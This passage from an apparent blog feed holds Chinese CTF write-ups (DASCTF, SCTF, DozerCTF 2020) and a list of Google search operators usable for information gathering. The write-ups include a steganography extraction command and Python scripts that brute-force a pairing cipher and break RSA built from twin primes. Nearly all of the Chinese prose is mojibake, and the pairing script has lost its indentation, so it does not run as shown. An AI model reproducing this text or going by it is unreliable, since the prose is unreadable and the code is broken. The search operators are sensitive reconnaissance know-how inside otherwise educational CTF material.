red_blue.png</code><br>å‘ç°æœ‰ä¸ªpngï¼Œäºæ˜¯å°†å®ƒæå–å‡ºæ¥ï¼š <code>zsteg red_blue.png -e &#39;b1,r,lsb,xy&#39; &gt; pass.png</code> </p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2160594035.png"></p><p>æœ€ç»ˆæˆåŠŸå¾—åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1309543423.png"></p><p>è¿™é‡Œè¿˜æ˜¯è€è§„çŸ©åƒä¸‡ä¸è¦å»è§£å‹å®ƒï¼ä¸ç„¶å…³é”®çš„æ–‡æ¡£å°†ä¼šä¸è§ï¼ˆä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“.jpgï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/435545863.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2618965096.png"></p><p>æœ€åbase85è§£ç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1239092664.png"></p><h2 id="QrJoker"><a href="#QrJoker" class="headerlink" title="QrJoker"></a>QrJoker</h2><p><a href="https://pan.baidu.com/s/1VF5sfPiJi_nUMeNNeyH-AQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šiwffï¼‰</p><h4 id="è§£æ³•ä¸€ï¼ˆå†™ä¸æ¥è„šæœ¬"><a href="#è§£æ³•ä¸€ï¼ˆå†™ä¸æ¥è„šæœ¬" class="headerlink" title="è§£æ³•ä¸€ï¼ˆå†™ä¸æ¥è„šæœ¬~"></a>è§£æ³•ä¸€ï¼ˆå†™ä¸æ¥è„šæœ¬~</h4><p>è„šæœ¬ä¸€æŠŠæ¢­å“ˆï¼Œå…·ä½“è§ï¼š<a href="http://www.fzwjscj.xyz/index.php/archives/36/">http://www.fzwjscj.xyz/index.php/archives/36/</a></p><h4 id="è§£æ³•äºŒï¼ˆå›¾ç‰‡è¿‡å¤šï¼Œèº«ä¸ºè“ç‹—çš„æˆ‘è‡ªç„¶å°±"><a href="#è§£æ³•äºŒï¼ˆå›¾ç‰‡è¿‡å¤šï¼Œèº«ä¸ºè“ç‹—çš„æˆ‘è‡ªç„¶å°±" class="headerlink" title="è§£æ³•äºŒï¼ˆå›¾ç‰‡è¿‡å¤šï¼Œèº«ä¸ºè“ç‹—çš„æˆ‘è‡ªç„¶å°±~"></a>è§£æ³•äºŒï¼ˆå›¾ç‰‡è¿‡å¤šï¼Œèº«ä¸ºè“ç‹—çš„æˆ‘è‡ªç„¶å°±~</h4><p>é¦–å…ˆå°†gifä¸­çš„64å¼ ä¿å­˜ä¸‹æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1254607035.png"></p><p>æ¥ç€ï¼Œä½¿ç”¨åœ¨çº¿å·¥å…·ï¼š<a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><p>å…·ä½“æ“ä½œå¯è§ï¼š<br><a href="http://blog.falsectf.top/page/e0a8211b.html#toc-heading-3">http://blog.falsectf.top/page/e0a8211b.html#toc-heading-3</a></p><p><a href="https://www.cnblogs.com/Mercurysur/p/13378407.html#Q6T72KP7">https://www.cnblogs.com/Mercurysur/p/13378407.html#Q6T72KP7</a></p><h2 id="bullshit"><a href="#bullshit" class="headerlink" title="bullshit"></a>bullshit</h2><p><a href="https://pan.baidu.com/s/1FEXhfEaeLaHbbv4UCQNUEA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šynpwï¼‰</p><p>ä¾æ¬¡å¯¹æ˜æ–‡ä¸¤ä¸ªå­—ç¬¦ä¸€ç»„è¿›è¡ŒåŠ å¯†ï¼Œå…³é”®ç‚¹æ˜¯æŠŠå¯†æ–‡å¯¹åº”çš„ç»„åˆ†å¼€ï¼Œçœ‹ä¸€ä¸‹pairingå‡½æ•°çš„è¿”å›å€¼ã€‚æ˜æ–‡çš„å­—ç¬¦èŒƒå›´åº”è¯¥æ˜¯0-9_A-Z_a-z_{}ï¼Œå…¶ä¸­æœ€å¤§çš„asciiæ•°å€¼æ˜¯125ï¼Œè¿”å›å€¼æœ€å¤§ä¸è¶…è¿‡16000ï¼Œæœ€å°å¤§äº2000ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥åˆ†å‰²å¯†æ–‡å¯¹åº”æ˜æ–‡æ®µï¼Œç„¶åçˆ†ç ´å‡ºå¯¹åº”æ˜æ–‡å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def pairing(a,b):</span><br><span class="line">shell &#x3D; max(a, b)</span><br><span class="line">step &#x3D; min(a, b)</span><br><span class="line">if step &#x3D;&#x3D; b:</span><br><span class="line">    flag &#x3D; 0</span><br><span class="line">else:</span><br><span class="line">    flag &#x3D; 1</span><br><span class="line">return shell ** 2 + step * 2 + flag</span><br><span class="line"></span><br><span class="line">text &#x3D; &#39;11869 10804 15229 10199 3354 10105 3241 10519 9908 2499 10505 10103 9519 9519 3232 9711 9520 3127 15722&#39;</span><br><span class="line"></span><br><span class="line">def decrypt(a):</span><br><span class="line">for i in range(255):</span><br><span class="line">    for j in range(255):</span><br><span class="line">        if pairing(i,j) &#x3D;&#x3D; a:</span><br><span class="line">            return i,j</span><br><span class="line">a &#x3D; text.split()</span><br><span class="line">l1 &#x3D; []</span><br><span class="line">for i in a:</span><br><span class="line">  if decrypt(int(i)):</span><br><span class="line">    m,n &#x3D; decrypt(int(i))</span><br><span class="line">    l1.append(m)</span><br><span class="line">    l1.append(n)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in l1:</span><br><span class="line">  flag +&#x3D; chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><blockquote><p>webçš„é¢˜ç›®æˆ‘ä¹Ÿæ²¡åšä¸Šå°±ä¸å†™äº†ï¼ˆå°±ç®—åšäº†ä¹Ÿä¸ä¼š.jpgï¼‰ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥çœ‹å„ä½å¸ˆå‚…çš„åšå®¢ï¼Œæ¯”å¦‚ï¼š<a href="https://www.gem-love.com/ctf/2514.html">Y1ngå¸ˆå‚…</a>ã€<a href="https://nop-sw.github.io/wiki/wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/">hshuiå¸ˆå‚…</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Googleä¿¡æ¯æœé›†è¯­æ³•åˆ©ç”¨</title>
      <link href="2020/07/11/Google%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%AF%AD%E6%B3%95%E5%88%A9%E7%94%A8/"/>
      <url>2020/07/11/Google%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%AF%AD%E6%B3%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€siteï¼ŒæŒ‡å®šæœç´¢çš„æŸå€‹ç¶²ç«™ã€‚ä¾‹ï¼šdesire site:bbs.gfan.com</p><p>äºŒã€filetypeï¼ŒæŒ‡å®šæœç´¢çš„æ–‡ä»¶é¡å‹ã€‚ä¾‹ï¼šseo filetype:doc</p><p>ä¸‰ã€åŒå¼•å·ï¼Œä»£è¡¨å®Œå…¨åŒ¹é…ï¼Œä½¿å…³é”®è¯ä¸åˆ†å¼€ï¼Œé¡ºåºéƒ½ä¸èƒ½å˜ã€‚</p><p>å››ã€å‡å·ï¼Œäº‹æœç´¢ç»“æœæ›´å‡†ç¡®ã€‚å‡å·ä¸å‰ä¸€ä¸ªå…³é”®è¯ä¹‹é—´ä¸€å®šè¦æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸åä¸€ä¸ªå…³é”®è¯ä¹‹é—´ä¸€å®šä¸èƒ½æœ‰ç©ºæ ¼ã€‚æœç´¢ç»“æœä¸ºï¼ŒåŒ¹é…å‰ä¸€ä¸ªå…³é”®è¯ä½†ä¸åŒ¹é…åä¸€ä¸ªå…³é”®è¯çš„ç»“æœã€‚ä¾‹å¦‚ï¼šseo -æœç´¢å¼•æ“ã€‚</p><p>äº”ã€ANDï¼Œé€»è¾‘ä¸ï¼Œè¿™ä¸ªå‘½ä»¤æˆ‘ä»¬å…¶å®ä¸€ç›´éƒ½åœ¨ç”¨ï¼Œåªæ˜¯æ²¡æœ‰æ„è¯†åˆ°ã€‚ä¸€èˆ¬ç”¨ç©ºæ ¼ä»£æ›¿ï¼Œè¿˜å¯ä»¥ç”¨â€œ+â€ä»£æ›¿ã€‚ä¾‹å¦‚ï¼šéœ¹é›³å¸ƒè¢‹+è´¥äº¡ä¹‹å‰‘ï¼Œè¿”å›çš„ç»“æœåŒæ—¶åŒ…å«ä¸¤è€…ã€‚</p><p>å…­ã€intitleï¼Œåœ¨ç»“æœçš„æ ‡é¢˜ä¸­åŒ…å«å…³é”®è¯ï¼Œä¸€æ¬¡åªèƒ½æœç´¢ä¸€ä¸ªå…³é”®è¯ã€‚</p><p>ä¸ƒã€inurlï¼Œè¿”å›çš„ç»“æœçš„urlä¸­åŒ…å«å…³é”®è¯ã€‚ä¾‹å¦‚ï¼šseo inurl:byrï¼Œå®ƒå°†è¿”å›ç½‘å€ä¸­åŒ…å«byrï¼Œè€Œå†…å®¹ä¸­åŒ…å«æœç´¢è¯çš„ç»“æœã€‚ä¸€æ¬¡åªèƒ½æœç´¢ä¸€ä¸ªå…³é”®è¯ã€‚</p><p>å…«ã€allintitleï¼Œåœ¨ç»“æœçš„æ ‡é¢˜ä¸­åŒæ—¶åŒ…å«å¤šä¸ªå…³é”®è¯ã€‚ä¾‹å¦‚ï¼šallintitle:seo æœç´¢å¼•æ“ï¼Œèµ·ä½œç”¨ç›¸å½“äºintitle:seo intitle:æœç´¢å¼•æ“ã€‚allintitleå±äºæ’ä»–æ€§æŒ‡ä»¤ï¼Œä¸èƒ½ä¸å…¶ä»–æŒ‡ä»¤ç»“åˆä½¿ç”¨ã€‚</p><p>ä¹ã€allinurlï¼Œç»“æœçš„urlä¸­åŒ…å«å¤šä¸ªå…³é”®è¯ã€‚ä¾‹å¦‚ï¼šallinurl:byr jobsï¼Œç­‰äºinurl:byr inurl:jobsã€‚allinurlä¹Ÿæ˜¯æ’ä»–æ€§æŒ‡ä»¤</p><p>åã€defineï¼ŒæŸ¥è¯¢å…³é”®è¯çš„è¯ä¹‰ï¼Œèµ·çš„æ˜¯å­—å…¸çš„ä½œç”¨ã€‚Googleä¼šè¿”å›åŒ…å«æŸ¥è¯¢å…³é”®è¯å®šä¹‰çš„ç½‘é¡µï¼Œä¾‹å¦‚ï¼šdefine:computer ï¼Œæ”¯æŒæ±‰å­—å“¦ï¼</p><p>åä¸€ã€xx in yyï¼Œå•ä½æ¢ç®—ï¼Œxxå’Œyyä»£è¡¨éœ€è¦æ¢ç®—çš„å•ä½ï¼Œä¸”xxå’Œyyä¸ºå•ä½çš„è‹±æ–‡ç¼©å†™ã€‚ä¾‹å¦‚ä½ æƒ³çŸ¥é“ä¸€ç›å¸ç­‰äºå¤šå°‘åƒå…‹ï¼Œåªéœ€è¾“å…¥ï¼š1 oz in kgã€‚</p><p>åäºŒã€weatherï¼ŒæŸ¥è¯¢æŸä¸€åœ°åŒºæˆ–åŸå¸‚çš„å¤©æ°”ã€‚ä¸è¿‡æˆ‘ä»¬è¿™ä¸€åœ°åŒºæˆ–åŸå¸‚å¿…é¡»æ˜¯Googleèƒ½è¯†åˆ«çš„ï¼Œä¾‹å¦‚ï¼šweather:beijingï¼ŒGoogleå°†ä¼šç»™æˆ‘ä»¬è¿”å›åŒ—äº¬çš„å¤©æ°”ã€‚</p><p>åä¸‰ã€intextï¼Œåœ¨ç»“æœçš„æ­£æ–‡å†…å®¹ä¸­åŒ…å«å…³é”®è¯ã€‚ä¾‹å¦‚ï¼šintext:å‰‘åœ£ï¼Œæ‰€æœ‰è¿”å›çš„ç½‘é¡µæ­£æ–‡ä¸­éƒ½åŒ…å«â€œå‰‘åœ£â€ã€‚</p><p>åå››ã€allintextï¼Œåœ¨ç»“æœçš„æ­£æ–‡å†…å®¹ä¸­åŒæ—¶åŒ…å«å¤šä¸ªå…³é”®è¯ã€‚æ’ä»–æ€§æŒ‡ä»¤ã€‚</p><p>åäº”ã€æ˜Ÿå·ï¼ˆ<em>ï¼‰ï¼Œé€šé…ç¬¦ï¼Œå¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼šæœç´¢</em>æ“ï¼Œåˆ™è¿”å›çš„ç»“æœä¸­ä¸ä»…æœ‰â€œæœç´¢å¼•æ“â€ï¼Œè¿˜æœ‰â€œæœç´¢å·¨æ“â€ä¹‹ç±»çš„ã€‚</p><p>åå…­ã€â€œ..â€ï¼Œè¡¨ç¤ºæ•°å€¼èŒƒå›´ã€‚ä¾‹å¦‚ï¼šæ‰‹æœº 2000..3000 å…ƒï¼Œæ³¨æ„â€œ3000â€ä¸â€œå…ƒâ€ä¹‹é—´å¿…é¡»æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸‰ä¸ªç‚¹ã€‚</p><p>åä¸ƒã€ORï¼Œé€»è¾‘æˆ–ï¼Œå¯ä»¥ç”¨â€œ|â€ä»£æ›¿ã€‚ä¾‹å¦‚ï¼šéœ¹é›³å¸ƒè¢‹|è´¥äº¡ä¹‹å‰‘ï¼Œåˆ™è¿”å›çš„ç»“æœä¸­ï¼Œè¦ä¹ˆåªå«æœ‰â€œéœ¹é›³å¸ƒè¢‹â€ï¼Œè¦ä¹ˆå°±åªå«æœ‰â€œè´¥äº¡ä¹‹å‰‘â€ï¼Œä¸å¯èƒ½æ˜¯åŒæ—¶åŒ…å«ä¸¤ä¸ªå…³é”®è¯çš„ç½‘é¡µã€‚</p><p>åå…«ã€infoï¼ŒæŸ¥è¯¢ç½‘ç«™çš„ä¸€äº›ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šinfo:bbs.byr.cnï¼Œå®ƒåªä¼šè¿”å›ä¸€ä¸ªç»“æœï¼Œæ˜¯ä¸€ä¸ªé€‰æ‹©åˆ—è¡¨ï¼Œåˆ—è¡¨çš„é€‰é¡¹æ˜¯è¿™ä¸ªç½‘ç«™çš„æŸä¸€æ–¹é¢çš„ä¿¡æ¯ã€‚info=cache+related+link+site+intext+intitleã€‚</p><p>åä¹ã€relatedï¼ŒæŸ¥è¯¢ä¸æ‰€ç»™çš„ç½‘ç«™ç±»ä¼¼çš„ç½‘ç«™ï¼Œå®ƒä¼šè¿”å›Googleè®¤ä¸ºçš„å¯èƒ½å’Œä½ æä¾›çš„ç½‘ç«™ç±»ä¼¼çš„å…¶ä»–ç½‘ç«™ã€‚ä¾‹å¦‚ï¼šrelated:bbs.gfan.comï¼Œä¼šè¿”å›å®‰å“å·´å£«ï¼Œeoeç¤¾åŒºï¼Œ91ç­‰ç«™ç‚¹ï¼Œä½†ä¸ä¼šè¿”å›æœºé”‹ç½‘ã€‚å…¶å®è¿™ä¸ªå‘½ä»¤Googleç»å¸¸åœ¨ç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬æœä¸€ä¸ªä¸œè¥¿ï¼ŒGoogleé™¤äº†è¿”å›ç»™æˆ‘ç»“æœï¼Œè¿˜ä¼šåœ¨ç»“æœä¸‹é¢ç»™æˆ‘ä»¬è¿”å›ä¸€äº›ç›¸å…³çš„è¯æ¡ã€‚</p><p>äºŒåã€linkï¼ŒæŸ¥è¯¢é“¾æ¥åˆ°è¿™ä¸ªurlçš„é¡µé¢ã€‚ä¾‹å¦‚ï¼šlink:bbs.gfan.comï¼Œä¼šè¿”å›æœºé”‹ç½‘çš„æ‰€æœ‰å¤–éƒ¨é“¾æ¥ã€‚ä»å…¶ä»–é¡µé¢æŒ‡å‘æœºé”‹ã€‚</p><p>äºŒåä¸€ã€linkdomainï¼ŒæŸ¥è¯¢è¿™ä¸ªurlé“¾æ¥çš„é¡µé¢ã€‚ä¾‹å¦‚ï¼šlinkdomain:bbs.gfan.com -site:bbs.gfan.comï¼Œè¿™æ ·çš„ç»“æœæ¯”è¾ƒå‡†ç¡®ï¼Œå› ä¸ºæ‰«é™¤äº†æœ¬èº«çš„å¹²æ‰°ï¼Œå®ƒå°†è¿”å›æœºé”‹ç½‘é“¾æ¥åˆ°çš„é¡µé¢ã€‚ä»æœºé”‹æŒ‡å‘å…¶ä»–é¡µé¢ã€‚</p><p>äºŒåäºŒã€cacheï¼Œæäº¤cache:urlï¼ŒGoogleä¼šæ˜¾ç¤ºå½“å‰ç½‘é¡µçš„å¿«ç…§ä¿¡æ¯ï¼Œä»è€Œæ›¿æ¢ç½‘é¡µçš„å½“å‰ä¿¡æ¯ã€‚è¿™ä¸ªå‘½ä»¤ç°åœ¨ä¹Ÿè¢«Googleé›†æˆåˆ°äº†æœç´¢ç»“æœé‡Œï¼Œå½“ä½ æŠŠé¼ æ ‡æ‚¬æµ®åœ¨æœç´¢ç»“æœä¸Šæ—¶ï¼Œå³ä¾§ä¼šè‡ªåŠ¨å‡ºç°æ­¤ç»“æœçš„å¿«ç…§ä¿¡æ¯ã€‚</p><p>äºŒåä¸‰ã€è®¡ç®—å™¨åŠŸèƒ½ã€‚è¾“å…¥æ•°å­¦è¡¨è¾¾å¼ï¼Œç„¶åGoogleè¿”å›ç»™ä½ ä¸€ä¸ªè®¡ç®—ç»“æœã€‚å¼ºå¤§çš„Googleä¸ä»…æ”¯æŒæ™®é€šè¿ç®—ï¼Œå®ƒè¿˜æ”¯æŒåƒä¸‰è§’å‡½æ•°ã€æŒ‡æ•°å‡½æ•°ç”šè‡³æ˜¯å¯¹æ•°å‡½æ•°è¿™æ ·çš„é«˜çº§è¿ç®—ã€‚å…³é”®æ˜¯ï¼Œä½ ä¼šè¾“å…¥è¿™äº›é«˜çº§æ•°å­¦ç¬¦å·ã€‚</p><p><strong>ä¸‹é¢æ˜¯ä¸‰ä¸ªä¸æ€ä¹ˆæ‡‚çš„å‘½ä»¤ï¼Œå¾ˆå°‘ç”¨ï¼Œè€Œä¸”åœ¨æœ‰é™çš„å®è·µä¸­ä¹Ÿæ²¡å¼„æ˜ç™½æ˜¯æ€ä¹ˆå›äº‹ï¼ŒæŠ„ä¸€æ®µç½‘ä¸Šçš„è§£é‡Šåœ¨è¿™é‡Œã€‚</strong>*</p><p>äºŒåå››ã€inanchorï¼Œå®ƒè¿”å›çš„ç»“æœæ˜¯å¯¼å…¥é“¾æ¥é”šæ–‡å­—ä¸­åŒ…å«æœç´¢è¯çš„é¡µé¢ã€‚æ¯”å¦‚åœ¨Googleæœç´¢ï¼šinanchor:ç‚¹å‡»è¿™é‡Œï¼Œè¿”å›çš„ç»“æœé¡µé¢æœ¬èº«å¹¶ä¸ä¸€å®šåŒ…å«â€œç‚¹å‡»è¿™é‡Œâ€è¿™å››ä¸ªå­—ï¼Œè€Œæ˜¯æŒ‡å‘è¿™äº›é¡µé¢çš„é“¾æ¥é”šæ–‡å­—ä¸­å‡ºç°äº†â€œç‚¹å‡»è¿™é‡Œâ€è¿™å››ä¸ªå­—ã€‚éœ€è¦æ³¨æ„åŒºåˆ«ä¸inurlï¼Œinurlæ˜¯ç½‘é¡µæœ¬èº«çš„urlåœ°å€ï¼Œè€Œinanchoræ˜¯åœ¨å¤–éƒ¨ç”¨äºæŒ‡å‘è¯¥urlåœ°å€çš„æ–‡æœ¬ï¼ˆ..ä¹‹é—´æ–‡æœ¬ï¼‰ä¸­æ‰¾ã€‚ä¾‹å¦‚ï¼šinanchor:downloadï¼Œä½ å¯èƒ½ä¼šå‘ç°æœ‰â€œFlashGetæœ€ä½³çš„ä¸‹è½½ç®¡ç†æ¨¡å¼â€ï¼Œè€Œè¯¥é¡µé¢ä¸­æ ¹æœ¬å°±æ²¡æœ‰â€œdownloadâ€å­—æ ·ã€‚</p><p>äºŒåäº”ã€allinanchorï¼Œinanchorçš„æ’ä»–æ€§æŒ‡ä»¤ã€‚</p><p>äºŒåå…­ã€daterangeï¼Œå½“æˆ‘ä»¬ä½¿ç”¨daterangeè¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼ŒGoogleä¼šå°†æŸ¥è¯¢çš„ç»“æœé™åˆ¶åœ¨ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´æ®µå†…ï¼Œè¿™ä¸ªæ—¶é—´ç›¸å¯¹äºç½‘ç«™æ¥è¯´ï¼Œæ˜¯æŒ‰ç½‘ç«™è¢«Googleæ”¶å½•çš„æ—¶é—´ç®—çš„ã€‚ä¾‹å¦‚ï¼šâ€Spice Girlsâ€œ daterange:2450958-2450968ã€‚è¿™é‡Œæ—¶é—´æ—¥æœŸçš„æ ¼å¼æ˜¯æŒ‰å¤©æ–‡å­¦çš„å„’ç•¥æ—¥ã€‚ï¼ˆè¿™ä¸ªæœç´¢è¯­æ³•Googleå¹¶ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºå®ƒä¼šè¿”å›ä¸€äº›è«åå…¶å¦™çš„ä¸œè¥¿ï¼‰</p><p>äºŒåä¸ƒã€allintext: = æœç´¢æ–‡æœ¬,ä½†ä¸åŒ…æ‹¬ç½‘é¡µæ ‡é¢˜å’Œé“¾æ¥allinlinks: = æœç´¢é“¾æ¥, ä¸åŒ…æ‹¬æ–‡æœ¬å’Œæ ‡é¢˜WordA OR WordB = æœç´¢åŒ…å«ä¸¤å…³é”®è¯ä¹‹ä¸€çš„é¡µé¢â€œWordâ€ OR â€œPhraseâ€ = ç²¾ç¡®çš„è¦æ±‚æœç´¢å•è¯æˆ–è€…å¥å­WordA -WordB = åŒ…å«å•è¯Aä½†æ˜¯ä¸åŒ…å«å•è¯BWordA +WordB = éƒ½åŒ…å«<del>WORD = å¯»æ‰¾æ­¤å•è¯å’Œå®ƒçš„åŒä¹‰è¯</del>WORD-WORD = åªæœç´¢åŒä¹‰è¯,ä¸è¦åŸè¯</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF 2020</title>
      <link href="2020/07/07/2020SCTF/"/>
      <url>2020/07/07/2020SCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="sign-in"><a href="#sign-in" class="headerlink" title="sign-in"></a>sign-in</h1><p>ç§‘å­¦ä¸Šç½‘ï¼Œè¿›å…¥tgç¾¤å³å¯è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2357551551.png"></p><h1 id="Dou-dizhu"><a href="#Dou-dizhu" class="headerlink" title="Dou dizhu"></a>Dou dizhu</h1><p>é¡¾åæ€ä¹‰ï¼Œæ–—åœ°ä¸»èµ¢äº†å°±èƒ½æ‹¿åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/914195782.png"></p><h1 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h1><p><a href="https://pan.baidu.com/s/1f4mKbBWD4qcbz8DOAKsqlQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šrcpvï¼‰</p><p>æ— çº¿ç”µï¼Œåˆ©ç”¨å·¥å…·robot36å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3845721635.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFå…­æœˆèµ› 2020</title>
      <link href="2020/06/26/2020DASCTF%E5%85%AD%E6%9C%88%E8%B5%9B/"/>
      <url>2020/06/26/2020DASCTF%E5%85%AD%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="é€æ˜åº¦"><a href="#é€æ˜åº¦" class="headerlink" title="é€æ˜åº¦"></a>é€æ˜åº¦</h2><p><a href="https://pan.baidu.com/s/13r-zafd2Bhol5c24pgOnmA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šwzbvï¼‰</p><p>æœ¬æ¥è¿™ä¸ªalphaæ˜¯é€æ˜åº¦ï¼Œä½†æ˜¯0~7å´éƒ½æœ‰ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2101259497.png"></p><p>è¿™é‡Œå¾ˆæ˜æ˜¾çœ‹å‡ºæœ‰ä¸ªåŒ…ï¼Œäºæ˜¯å°±ä¿å­˜äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2216304538.png"></p><p>æ¥ç€å°±æŠŠåŒ…åˆ†è§£å‡ºæ¥ï¼Œæ‰“å¼€å‘ç°æ˜¯åŠ å¯†çš„<br>äºæ˜¯æ ¹æ®æç¤ºå¼€å§‹çˆ†ç ´è·å–å¯†ç ï¼šnepnbï¼Œæœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2586896462.png"></p><h2 id="cryptographic-call"><a href="#cryptographic-call" class="headerlink" title="cryptographic_call"></a>cryptographic_call</h2><p><a href="https://pan.baidu.com/s/1a7SlN1hg7vcC2Ob_yb8Ljg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š3idzï¼‰</p><p>è¿™é¢˜æ²¡æå‡ºæ¥ï¼Œå°±åˆ†äº«<a href="http://www.ga1axy.top/index.php/archives/42/"><strong>å¸ˆå‚…ä»¬çš„wp</strong></a>å§</p><h2 id="Gemini-Man"><a href="#Gemini-Man" class="headerlink" title="Gemini_Man"></a>Gemini_Man</h2><p><a href="https://pan.baidu.com/s/1Wvjqc0VViGxmpMxTFvbbLg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šovaoï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">n &#x3D; int(open(&#39;N.txt&#39;,&#39;rb&#39;).read())</span><br><span class="line">c &#x3D; int(open(&#39;C.txt&#39;,&#39;rb&#39;).read())</span><br><span class="line">p,err &#x3D; gmpy2.iroot(n, 2)</span><br><span class="line">q &#x3D; p+2</span><br><span class="line"></span><br><span class="line">d &#x3D; gmpy2.invert(65537,(p-1)*(q-1))</span><br><span class="line">#print long_to_bytes(p)</span><br><span class="line">print long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DozerCTF 2020</title>
      <link href="2020/06/14/2020DozerCTF/"/>
      <url>2020/06/14/2020DozerCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/882724305.png"></p><h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><blockquote><p>é¢˜ç›®ï¼šè¿™æ˜¯çœŸçš„ç­¾åˆ°é¢˜<br><a href="https://pan.baidu.com/s/1PV1LfK0rQIMOtXkCf6_EHg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šmfvcï¼‰</p></blockquote><p>æ ¹æ®é™„ä»¶åå­—åº”è¯¥å°±æ˜¯baseè§£ç <br>åœ¨å„ç§å°è¯•ä¹‹åï¼Œå¯å‘ç°éœ€è¦ç»è¿‡base64-&gt;base32-&gt;base16-&gt;base58(å›½å¤–çš„ï¼‰è§£ç ä¹‹åå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/843456108.png"></p><h2 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h2><blockquote><p>é¢˜ç›®ï¼šä¸ä¼šå§ï¼Œä¸ä¼šçœŸæœ‰äººä¸ä¼šæ³¨å…¥å§</p></blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a 